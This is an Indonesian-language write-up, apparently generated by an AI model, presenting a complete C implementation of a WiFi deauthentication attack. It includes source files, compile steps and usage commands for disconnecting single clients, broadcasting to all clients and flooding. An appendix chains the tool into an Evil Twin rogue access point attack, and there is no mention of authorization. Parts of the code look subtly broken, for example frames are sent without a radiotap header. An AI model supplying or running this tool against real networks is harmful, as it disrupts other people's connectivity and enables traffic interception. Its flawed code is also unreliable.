# 🔴 Deauth Attack: Makalah & Implementasi Lengkap

**Versi:** 1.0  
**Tanggal:** 15 Agustus 2026  
**Penulis:** DeepSeek  
**Lisensi:** MIT  

---

## 📋 Daftar Isi

1. [Makalah Deauth Attack](#1-makalah-deauth-attack) — Teori, cara kerja, dan penggunaan
2. [Header dan Fungsinya](#2-header-dan-fungsinya) — Penjelasan setiap header
3. [Implementasi: main.c](#3-implementasi-mainc) — Entry point dan argument parsing
4. [Implementasi: deauth.h](#4-implementasi-deauthh) — Deklarasi fungsi
5. [Implementasi: deauth.c](#5-implementasi-deauthc) — Inti Deauth Attack
6. [Compile & Jalankan](#6-compile--jalankan) — Cara build dan test
7. [Referensi](#7-referensi) — Buku, website, tools
8. [Lampiran](#8-lampiran) — Reason code, opcode, troubleshooting

---

## 1. Makalah Deauth Attack

### 1.1. Abstrak — Ringkasan tentang Deauth Attack

**Deauthentication Attack** (Deauth Attack) adalah serangan denial-of-service (DoS) pada jaringan WiFi yang bertujuan memutus koneksi antara client dan Access Point (AP). Serangan ini bekerja dengan mengirimkan **frame deauthentication** (opcode `0xC000`) ke client atau AP, yang membuat salah satu pihak percaya bahwa pihak lain meminta untuk mengakhiri koneksi.

**Kata Kunci:** Deauth Attack, Deauthentication, WiFi Security, DoS, Packet Injection, 802.11

---

### 1.2. Pendahuluan — Latar belakang dan tujuan

#### 1.2.1. Apa Itu Deauth Attack?

Deauth Attack adalah serangan yang memanfaatkan **management frame** 802.11 yang tidak terenkripsi. Frame deauthentication dikirim untuk memberi tahu client bahwa AP ingin memutus koneksi. Karena frame ini tidak diautentikasi, attacker dapat memalsukannya dan mengirimkannya ke client.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DEAUTH ATTACK                                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Client (00:11:22:33:44:55)     Attacker         AP (02:11:22:33:44:55) │
│  ────────────────────────────────────────────────────────────────  │
│         │                            │                            │
│         │    1. Client terhubung ke AP                           │
│         │<───────────────────────────────────────────────────────>│
│         │                            │                            │
│         │    2. Attacker kirim deauth frame ke client            │
│         │<───────────────────────────│                            │
│         │    (seolah-olah dari AP)   │                            │
│         │                            │                            │
│         │    3. Client disconnect dari AP                        │
│         │    (percaya AP menyuruh)   │                            │
│         │                            │                            │
│         │    4. Client cari AP baru                              │
│         │───────────────────────────────────────────────────────>│
│         │                            │                            │
│         │    5. Client connect ke Rogue AP (jika ada)            │
│         │<───────────────────────────────────────────────────────>│
│         │                            │                            │
└─────────────────────────────────────────────────────────────────────┘
```

#### 1.2.2. Mengapa Deauth Attack Berbahaya?

| Alasan | Penjelasan |
|--------|------------|
| **Tidak terenkripsi** | Frame deauth dikirim tanpa enkripsi, mudah dipalsukan |
| **Tidak diautentikasi** | Tidak ada verifikasi bahwa frame benar dari AP |
| **Efektif** | Client langsung disconnect tanpa syarat |
| **Multi-purpose** | Bisa digunakan untuk Evil Twin, handshake capture, DoS |

#### 1.2.3. Tujuan Proyek

1. Memahami cara kerja deauthentication frame di 802.11
2. Mengimplementasikan Deauth Attack dari nol di C
3. Membangun tool yang efisien dan portable
4. Memahami kelemahan keamanan WiFi

---

### 1.3. Teori Dasar — Cara kerja Deauth Attack

#### 1.3.1. Struktur Frame Deauth

Frame deauth adalah **management frame** dengan opcode `0xC000`.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DEAUTH FRAME (0xC000)                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Frame Control: 0xC000 (Type=00 Management, Subtype=1100 Deauth)  │
│  Duration: 0                                                        │
│  Address 1: Client MAC (target)                                    │
│  Address 2: AP MAC (sender)                                        │
│  Address 3: BSSID (AP)                                             │
│  Sequence Control: 0                                               │
│  Reason Code: 1-24 (alasan deauth)                                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 1.3.2. Reason Code — Alasan Deauth

| Code | Nama | Deskripsi |
|------|------|-----------|
| 1 | Unspecified | Alasan tidak spesifik |
| 2 | Previous authentication invalid | Auth sebelumnya tidak valid |
| 3 | STA leaving | Client/AP meninggalkan jaringan |
| 4 | Inactivity | Tidak aktif |
| 5 | AP busy | AP sibuk |
| 6 | Class 2 frame | Frame dari STA tidak terauth |
| **7** | **Class 3 frame** | **Frame dari STA tidak terasosiasi (default)** |
| 8 | STA leaving | Client meninggalkan jaringan |
| 9 | STA not authenticated | Client tidak terautentikasi |
| 13 | Invalid IE | Invalid Information Element |
| 14 | MIC failure | MIC failure |
| 15 | 4-way handshake timeout | Timeout handshake |

#### 1.3.3. Cara Kerja di Layer 2

```
┌─────────────────────────────────────────────────────────────────────┐
│                    LAYER 2 FRAME FLOW                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. Raw socket dibuat dengan AF_PACKET, SOCK_RAW                  │
│  2. Frame deauth dibangun di memory                                │
│  3. Frame dikirim via sendto() ke interface                        │
│  4. Frame diterima client, client langsung disconnect              │
│  5. Client mungkin reconnect ke AP (atau Rogue AP)                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 2. Header dan Fungsinya — Penjelasan setiap header

### 2.1. Header yang Digunakan

| Header | Fungsi | Digunakan Untuk |
|--------|--------|-----------------|
| **`<stdio.h>`** | Input/Output | `printf()` untuk output, `perror()` untuk error |
| **`<stdlib.h>`** | Standard Library | `system()` untuk setup monitor mode, `atoi()` untuk parse args |
| **`<string.h>`** | Manipulasi String | `memcpy()` untuk copy MAC, `memset()` untuk set broadcast |
| **`<unistd.h>`** | System Calls | `usleep()` untuk delay, `close()` untuk tutup socket |
| **`<errno.h>`** | Error Handling | `errno`, `EINTR`, `EAGAIN` untuk error handling |
| **`<sys/socket.h>`** | Socket API | `socket()`, `sendto()` untuk kirim frame |
| **`<sys/ioctl.h>`** | Kontrol Perangkat | `ioctl()` untuk kontrol interface |
| **`<net/if.h>`** | Interface Network | `struct ifreq` untuk informasi interface |
| **`<linux/if_packet.h>`** | Raw Socket Layer 2 | `struct sockaddr_ll`, `AF_PACKET`, `SOCK_RAW` |
| **`<linux/if_ether.h>`** | Konstanta Ethernet | `ETH_P_ALL` untuk semua frame |
| **`<arpa/inet.h>`** | Konversi Endian | `htons()` untuk network byte order |
| **`<signal.h>`** | Signal Handling | `signal()` untuk handle Ctrl+C |
| **`<pthread.h>`** | Multi-threading | `pthread_create()` untuk flooding |

---

## 3. Implementasi: `main.c`

### 3.1. Deskripsi — Entry point dan argument parsing

**File:** `main.c`  
**Fungsi:** Entry point program, parsing argument, orchestrate deauth attack.

**Cara Kerja:**
1. Parse command line arguments
2. Setup monitor mode pada interface
3. Panggil fungsi deauth dari `deauth.c`
4. Handle Ctrl+C untuk berhenti

### 3.2. Source Code — `main.c`

```c
// main.c - Entry point untuk Deauth Attack
// Fungsi: Parse argument, setup interface, jalankan deauth
// Compile: gcc -o deauth main.c deauth.c -pthread
// Jalankan: sudo ./deauth -i wlan0 -c 00:11:22:33:44:55 -a 02:11:22:33:44:55

// ================================================================
// 1. HEADER
// ================================================================

#include <stdio.h>          // printf, fprintf, perror
#include <stdlib.h>         // atoi, exit
#include <string.h>         // strcmp, strcpy
#include <unistd.h>         // getopt (opsional)
#include <signal.h>         // signal, SIGINT
#include <pthread.h>        // pthread_create, pthread_join
#include "deauth.h"         // Deklarasi fungsi deauth

// ================================================================
// 2. GLOBAL VARIABLES
// ================================================================

volatile int running = 1;   // Flag untuk loop utama

// ================================================================
// 3. SIGNAL HANDLER
// ================================================================

// Fungsi: Handle Ctrl+C untuk berhenti dengan rapi
// Header: <signal.h>
void signal_handler(int sig) {
    printf("\n[!] Stopping deauth attack...\n");
    running = 0;
}

// ================================================================
// 4. FUNCTION: String to MAC
// ================================================================

// Fungsi: Konversi string MAC ke array bytes
// Header: <string.h> (strlen), <stdlib.h> (strtol)
int string_to_mac(const char *str, uint8_t *mac) {
    if (strlen(str) != 17) return -1;  // Format: xx:xx:xx:xx:xx:xx
    
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)strtol(str + (i * 3), NULL, 16);
    }
    return 0;
}

// ================================================================
// 5. FUNCTION: MAC to String
// ================================================================

// Fungsi: Konversi MAC bytes ke string untuk display
// Header: <stdio.h> (sprintf)
void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ================================================================
// 6. FUNCTION: Print Usage
// ================================================================

// Fungsi: Tampilkan cara penggunaan program
// Header: <stdio.h> (printf)
void print_usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n", prog);
    printf("\nOPTIONS:\n");
    printf("  -i <iface>     Interface (default: wlan0)\n");
    printf("  -c <mac>       Client MAC address (required)\n");
    printf("  -a <mac>       AP MAC address (BSSID)\n");
    printf("  -r <reason>    Reason code (1-24, default: 7)\n");
    printf("  -f <count>     Flood count (default: 1)\n");
    printf("  -d <ms>        Delay between frames (default: 100ms)\n");
    printf("  -b             Broadcast to all clients\n");
    printf("  -h             Show this help\n");
    printf("\nREASON CODES:\n");
    printf("  1  = Unspecified\n");
    printf("  3  = Leaving network\n");
    printf("  4  = Inactivity\n");
    printf("  7  = Class 3 frame from nonassociated STA (default)\n");
    printf("  14 = MIC failure\n");
    printf("  15 = 4-way handshake timeout\n");
}

// ================================================================
// 7. MAIN
// ================================================================

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    uint8_t client_mac[6] = {0};
    uint8_t ap_mac[6] = {0};
    uint16_t reason = 7;
    int flood_count = 1;
    int delay_ms = 100;
    int broadcast = 0;
    int client_set = 0;
    int ap_set = 0;
    
    // Signal handler — dari <signal.h>
    signal(SIGINT, signal_handler);
    
    // ===== PARSE ARGUMENTS =====
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-i") == 0 && i+1 < argc) {
            iface = argv[++i];
        } else if (strcmp(argv[i], "-c") == 0 && i+1 < argc) {
            if (string_to_mac(argv[++i], client_mac) == 0) client_set = 1;
        } else if (strcmp(argv[i], "-a") == 0 && i+1 < argc) {
            if (string_to_mac(argv[++i], ap_mac) == 0) ap_set = 1;
        } else if (strcmp(argv[i], "-r") == 0 && i+1 < argc) {
            reason = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-f") == 0 && i+1 < argc) {
            flood_count = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i+1 < argc) {
            delay_ms = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-b") == 0) {
            broadcast = 1;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        }
    }
    
    // ===== VALIDATE ARGUMENTS =====
    if (!client_set && !broadcast) {
        fprintf(stderr, "Error: Client MAC required (use -c or -b)\n");
        print_usage(argv[0]);
        return 1;
    }
    
    if (!ap_set) {
        // Generate random AP MAC jika tidak diberikan
        ap_mac[0] = 0x02;
        for (int i = 1; i < 6; i++) {
            ap_mac[i] = rand() & 0xFF;
        }
        char mac_str[18];
        mac_to_string(ap_mac, mac_str);
        printf("[*] Using random BSSID: %s\n", mac_str);
    }
    
    if (reason < 1 || reason > 24) {
        fprintf(stderr, "Error: Invalid reason code (1-24)\n");
        return 1;
    }
    
    // ===== PRINT CONFIG =====
    char client_str[18], ap_str[18];
    mac_to_string(client_mac, client_str);
    mac_to_string(ap_mac, ap_str);
    
    printf("========================================\n");
    printf("  DEAUTH ATTACK\n");
    printf("========================================\n");
    printf("Interface:   %s\n", iface);
    printf("Client MAC:  %s\n", broadcast ? "BROADCAST" : client_str);
    printf("AP MAC:      %s\n", ap_str);
    printf("Reason:      %d\n", reason);
    printf("Flood count: %d\n", flood_count);
    printf("Delay:       %d ms\n", delay_ms);
    printf("========================================\n\n");
    
    // ===== SETUP MONITOR MODE =====
    printf("[*] Setting up monitor mode on %s...\n", iface);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ip link set %s down", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iw dev %s set type monitor", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "ip link set %s up", iface);
    system(cmd);
    
    // ===== JALANKAN DEAUTH =====
    printf("[+] Deauth attack started!\n");
    printf("[+] Press Ctrl+C to stop\n\n");
    
    deauth_config_t cfg = {
        .iface = iface,
        .client_mac = {0},
        .ap_mac = {0},
        .reason = reason,
        .delay_ms = delay_ms,
        .flood_count = flood_count,
        .broadcast = broadcast,
        .running = 1
    };
    
    memcpy(cfg.client_mac, client_mac, 6);
    memcpy(cfg.ap_mac, ap_mac, 6);
    
    if (broadcast) {
        // Set broadcast MAC
        memset(cfg.client_mac, 0xFF, 6);
    }
    
    // Panggil fungsi deauth dari deauth.c
    deauth_start(&cfg);
    
    // Tunggu sampai di-stop
    while (running) {
        sleep(1);
    }
    
    cfg.running = 0;
    printf("\n[+] Deauth attack stopped.\n");
    return 0;
}
```

---

## 4. Implementasi: `deauth.h`

### 4.1. Deskripsi — Deklarasi fungsi deauth

**File:** `deauth.h`  
**Fungsi:** Mendeklarasikan semua fungsi dan struktur yang digunakan oleh `deauth.c`.

### 4.2. Source Code — `deauth.h`

```c
// deauth.h - Deklarasi Deauth Attack
// Fungsi: Header untuk deauth.c, mendeklarasikan semua fungsi
// Digunakan oleh: main.c, deauth.c

#ifndef DEAUTH_H
#define DEAUTH_H

// ================================================================
// 1. HEADER YANG DIGUNAKAN
// ================================================================

#include <stdint.h>     // uint8_t, uint16_t

// ================================================================
// 2. KONSTANTA 802.11
// ================================================================

#define IEEE80211_FC_DEAUTH         0xC000  // Opcode deauth (0xC0 << 4)
#define IEEE80211_FTYPE_MGMT        0x00    // Management frame type
#define IEEE80211_STYPE_DEAUTH      0x0C    // Deauth subtype

// Reason codes
#define REASON_UNSPECIFIED          1
#define REASON_PREV_AUTH_INVALID    2
#define REASON_DEAUTH_LEAVING       3
#define REASON_DISASSOC_INACTIVE    4
#define REASON_DISASSOC_AP_BUSY     5
#define REASON_CLASS2_FRAME         6
#define REASON_CLASS3_FRAME         7
#define REASON_DISASSOC_STA_LEAVING 8
#define REASON_STA_NOT_AUTH         9
#define REASON_DISASSOC_POOR_SIGNAL 10
#define REASON_INVALID_IE           13
#define REASON_MIC_FAILURE          14
#define REASON_4WAY_HANDSHAKE_TIMEOUT 15

// ================================================================
// 3. STRUKTUR HEADER 802.11
// ================================================================

// Struktur MAC header untuk frame deauth
typedef struct {
    uint16_t frame_control;    // 0xC000 = Deauth — htons()
    uint16_t duration;         // 0 = no NAV
    uint8_t addr1[6];          // Destination MAC (client)
    uint8_t addr2[6];          // Source MAC (AP)
    uint8_t addr3[6];          // BSSID (AP)
    uint16_t seq_ctrl;         // Sequence number — htons()
    uint8_t payload[];         // Reason code (2 bytes)
} __attribute__((packed)) wifi_header_t;

// ================================================================
// 4. STRUKTUR KONFIGURASI DEAUTH
// ================================================================

typedef struct {
    const char *iface;          // Interface name
    uint8_t client_mac[6];      // Target client MAC
    uint8_t ap_mac[6];          // AP MAC address
    uint16_t reason;            // Reason code
    int delay_ms;               // Delay between frames
    int flood_count;            // Number of frames to send
    int broadcast;              // Broadcast flag
    volatile int running;       // Running flag
} deauth_config_t;

// ================================================================
// 5. DEKLARASI FUNGSI
// ================================================================

// ===== SOCKET FUNCTIONS =====
// Fungsi: Buat raw socket untuk layer 2
int create_raw_socket(const char *iface);

// Fungsi: Kirim frame via raw socket
int send_frame(int sock, const uint8_t *buf, int len, const char *iface);

// ===== BUILD DEAUTH =====
// Fungsi: Bangun frame deauth dengan opcode 0xC000
int build_deauth(uint8_t *buf, uint8_t *client_mac, uint8_t *ap_mac, 
                 uint16_t reason, uint16_t seq);

// ===== SEND DEAUTH =====
// Fungsi: Kirim deauth ke client
int send_deauth_frame(const char *iface, uint8_t *client_mac, 
                      uint8_t *ap_mac, uint16_t reason);

// ===== DEAUTH LOOP =====
// Fungsi: Kirim deauth berulang-ulang (flood)
void *deauth_loop(void *arg);

// ===== START DEAUTH =====
// Fungsi: Start deauth attack (multi-threaded)
int deauth_start(deauth_config_t *cfg);

#endif // DEAUTH_H
```

---

## 5. Implementasi: `deauth.c`

### 5.1. Deskripsi — Inti Deauth Attack

**File:** `deauth.c`  
**Fungsi:** Implementasi semua fungsi deauth, termasuk build frame, send frame, dan flooding.

**Cara Kerja:**
1. `create_raw_socket()` — Buat raw socket di layer 2
2. `build_deauth()` — Bangun frame deauth dengan opcode 0xC000
3. `send_deauth_frame()` — Kirim frame ke target
4. `deauth_loop()` — Kirim berulang-ulang (flood)
5. `deauth_start()` — Start attack dengan thread

### 5.2. Source Code — `deauth.c`

```c
// deauth.c - Implementasi Deauth Attack
// Fungsi: Build dan kirim frame deauth (0xC000)
// Compile: gcc -c deauth.c
// Digunakan oleh: main.c

// ================================================================
// 1. HEADER
// ================================================================

#include "deauth.h"         // Deklarasi sendiri
#include <stdio.h>          // printf
#include <string.h>         // memcpy, memset
#include <unistd.h>         // usleep, close
#include <sys/socket.h>     // socket, sendto
#include <sys/ioctl.h>      // ioctl
#include <net/if.h>         // struct ifreq
#include <linux/if_packet.h>// struct sockaddr_ll, AF_PACKET, SOCK_RAW
#include <linux/if_ether.h> // ETH_P_ALL
#include <arpa/inet.h>      // htons
#include <pthread.h>        // pthread_create

// ================================================================
// 2. SOCKET FUNCTIONS
// ================================================================

// ===== CREATE RAW SOCKET =====
// Fungsi: Buat raw socket di layer 2 (AF_PACKET, SOCK_RAW)
// Header: <sys/socket.h> (socket), <net/if.h> (struct ifreq), <linux/if_packet.h> (AF_PACKET)
int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    // socket() — dari <sys/socket.h>
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    // ioctl() — dari <sys/ioctl.h>
    // struct ifreq — dari <net/if.h>
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

// ===== SEND FRAME =====
// Fungsi: Kirim frame melalui raw socket
// Header: <sys/socket.h> (sendto), <linux/if_packet.h> (struct sockaddr_ll)
int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;  // dari <linux/if_packet.h>
    struct ifreq ifr;         // dari <net/if.h>
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));  // dari <string.h>
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    // sendto() — dari <sys/socket.h>
    int ret = sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
    if (ret < 0) perror("sendto");
    return ret;
}

// ================================================================
// 3. BUILD DEAUTH
// ================================================================

// ===== BUILD DEAUTH FRAME =====
// Fungsi: Bangun frame deauth dengan opcode 0xC000
// Header: <string.h> (memcpy), <arpa/inet.h> (htons)
int build_deauth(uint8_t *buf, uint8_t *client_mac, uint8_t *ap_mac, 
                 uint16_t reason, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    // ----- FRAME CONTROL: DEAUTH (0xC000) -----
    // Type=00 (Management), Subtype=1100 (Deauth)
    // htons() — dari <arpa/inet.h>
    hdr->frame_control = htons(IEEE80211_FC_DEAUTH);  // 0xC000
    hdr->duration = 0;
    
    // ----- ADDRESS 1: DESTINATION (CLIENT) -----
    // memcpy() — dari <string.h>
    memcpy(hdr->addr1, client_mac, 6);
    
    // ----- ADDRESS 2: SOURCE (AP) -----
    memcpy(hdr->addr2, ap_mac, 6);
    
    // ----- ADDRESS 3: BSSID (AP) -----
    memcpy(hdr->addr3, ap_mac, 6);
    
    // ----- SEQUENCE CONTROL -----
    hdr->seq_ctrl = htons(seq << 4);
    
    // ----- REASON CODE (2 bytes) -----
    *pos++ = reason & 0xFF;        // Low byte
    *pos++ = (reason >> 8) & 0xFF; // High byte
    
    int len = sizeof(wifi_header_t) + 2;
    return len;
}

// ================================================================
// 4. SEND DEAUTH
// ================================================================

// ===== SEND DEAUTH FRAME =====
// Fungsi: Kirim deauth ke client
// Header: <unistd.h> (close)
int send_deauth_frame(const char *iface, uint8_t *client_mac, 
                      uint8_t *ap_mac, uint16_t reason) {
    int sock;
    uint8_t buf[256];
    int len;
    static uint16_t seq = 0;
    
    // create_raw_socket() — fungsi sendiri
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    // build_deauth() — fungsi sendiri
    len = build_deauth(buf, client_mac, ap_mac, reason, seq++);
    
    // send_frame() — fungsi sendiri
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);  // close dari <unistd.h>
    return ret;
}

// ================================================================
// 5. DEAUTH LOOP
// ================================================================

// ===== DEAUTH LOOP =====
// Fungsi: Kirim deauth berulang-ulang (flooding)
// Header: <unistd.h> (usleep), <pthread.h> (pthread_exit)
void *deauth_loop(void *arg) {
    deauth_config_t *cfg = (deauth_config_t*)arg;
    int count = 0;
    
    while (cfg->running && (cfg->flood_count == 0 || count < cfg->flood_count)) {
        int ret = send_deauth_frame(cfg->iface, cfg->client_mac, 
                                    cfg->ap_mac, cfg->reason);
        if (ret > 0) {
            count++;
            if (count % 10 == 0) {
                char mac_str[18];
                mac_to_string(cfg->client_mac, mac_str);
                printf("[Deauth] Sent %d frames to %s\n", count, mac_str);
            }
        }
        
        usleep(cfg->delay_ms * 1000);  // usleep dari <unistd.h>
    }
    
    pthread_exit(NULL);
    return NULL;
}

// ================================================================
// 6. START DEAUTH
// ================================================================

// ===== START DEAUTH =====
// Fungsi: Start deauth attack di thread terpisah
// Header: <pthread.h> (pthread_create)
int deauth_start(deauth_config_t *cfg) {
    pthread_t tid;
    
    // Buat thread untuk deauth loop
    if (pthread_create(&tid, NULL, deauth_loop, cfg) != 0) {
        perror("pthread_create");
        return -1;
    }
    
    // Detach thread agar tidak perlu join
    pthread_detach(tid);
    
    return 0;
}
```

---

## 6. Compile & Jalankan

### 6.1. Compile — Build binary

```bash
# Compile semua file
gcc -o deauth main.c deauth.c -pthread

# Atau dengan debug symbol
gcc -g -o deauth main.c deauth.c -pthread

# Atau dengan optimasi
gcc -O2 -o deauth main.c deauth.c -pthread
```

### 6.2. Cara Penggunaan — Command examples

```bash
# 1. Deauth satu client
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55

# 2. Deauth broadcast (semua client)
sudo ./deauth -b -a 02:11:22:33:44:55

# 3. Deauth flood (100x)
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55 -f 100

# 4. Deauth dengan delay 50ms (lebih cepat)
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55 -d 50

# 5. Deauth dengan reason code custom
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55 -r 3

# 6. Deauth dengan interface custom
sudo ./deauth -i wlan1 -c 00:11:22:33:44:55 -a 02:11:22:33:44:55
```

### 6.3. Output yang Diharapkan

```bash
========================================
  DEAUTH ATTACK
========================================
Interface:   wlan0
Client MAC:  00:11:22:33:44:55
AP MAC:      02:11:22:33:44:55
Reason:      7
Flood count: 100
Delay:       100 ms
========================================

[*] Setting up monitor mode on wlan0...
[+] Deauth attack started!
[+] Press Ctrl+C to stop

[Deauth] Sent 10 frames to 00:11:22:33:44:55
[Deauth] Sent 20 frames to 00:11:22:33:44:55
[Deauth] Sent 30 frames to 00:11:22:33:44:55
^C
[!] Stopping deauth attack...
[+] Deauth attack stopped.
```

---

## 7. Referensi

### 7.1. Buku — Referensi yang direkomendasikan

- "802.11 Wireless Networks" - Matthew Gast
- "WiFi Security" - Johnny Cache
- "The Linux Programming Interface" - Michael Kerrisk

### 7.2. Website — Sumber online

- IEEE 802.11: https://standards.ieee.org/
- Linux Wireless: https://wireless.wiki.kernel.org
- Aircrack-ng: https://www.aircrack-ng.org/

### 7.3. Tools — Software terkait

- Wireshark - Packet analysis
- Aircrack-ng - WiFi security testing
- tcpdump - CLI packet capture

---

## 8. Lampiran

### A. Reason Code — Daftar lengkap

| Code | Nama | Deskripsi |
|------|------|-----------|
| 1 | Unspecified | Alasan tidak spesifik |
| 2 | Previous authentication invalid | Auth sebelumnya tidak valid |
| 3 | STA leaving | Client/AP meninggalkan jaringan |
| 4 | Inactivity | Tidak aktif |
| 5 | AP busy | AP sibuk |
| 6 | Class 2 frame | Frame dari STA tidak terauth |
| **7** | **Class 3 frame** | **Frame dari STA tidak terasosiasi (default)** |
| 8 | STA leaving | Client meninggalkan jaringan |
| 9 | STA not authenticated | Client tidak terautentikasi |
| 10 | Poor signal | Sinyal buruk |
| 13 | Invalid IE | Invalid Information Element |
| 14 | MIC failure | MIC failure |
| 15 | 4-way handshake timeout | Timeout handshake |
| 16 | Group key timeout | Group key update timeout |
| 17 | IE differs | IE di 4-way berbeda |
| 18 | Invalid group cipher | Invalid group cipher |
| 19 | Invalid pairwise cipher | Invalid pairwise cipher |
| 20 | Invalid AKMP | Invalid AKMP |
| 21 | Unsupported RSNE | Unsupported RSNE version |
| 22 | Invalid RSNE cap | Invalid RSNE capabilities |
| 23 | 802.1X auth failed | 802.1X authentication failed |
| 24 | Cipher out of policy | Cipher out of policy |

### B. Opcode — Frame Control values

| Frame | Hex | Type | Subtype |
|-------|-----|------|---------|
| **Deauth** | `0xC000` | 0 (Management) | 12 (Deauth) |
| Beacon | `0x8000` | 0 (Management) | 8 (Beacon) |
| Probe Req | `0x4000` | 0 (Management) | 4 (Probe Req) |
| Probe Resp | `0x5000` | 0 (Management) | 5 (Probe Resp) |
| Auth | `0xB000` | 0 (Management) | 11 (Auth) |
| Assoc Req | `0x0000` | 0 (Management) | 0 (Assoc Req) |
| Assoc Resp | `0x1000` | 0 (Management) | 1 (Assoc Resp) |

### C. Troubleshooting

| Masalah | Solusi |
|---------|--------|
| **"Operation not permitted"** | Jalankan dengan `sudo` |
| **"No such device"** | Cek interface dengan `iw dev` |
| **"Monitor mode not supported"** | Cek adapter support monitor mode |
| **Client tidak disconnect** | Coba flood dengan `-f 100` |
| **Frame tidak terkirim** | Cek raw socket dengan tcpdump |

### D. Contoh Penggunaan di Evil Twin

```bash
# Step 1: Deauth client dari AP asli
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55 -f 50

# Step 2: Jalankan Rogue AP
sudo ./rogue_ap -s FreeWiFi -c 6

# Step 3: Client reconnect ke Rogue AP
# Client terkoneksi ke AP kita! ✅
```

---

**Akhir Dokumen**

> *"Deauth Attack: Simple but powerful."*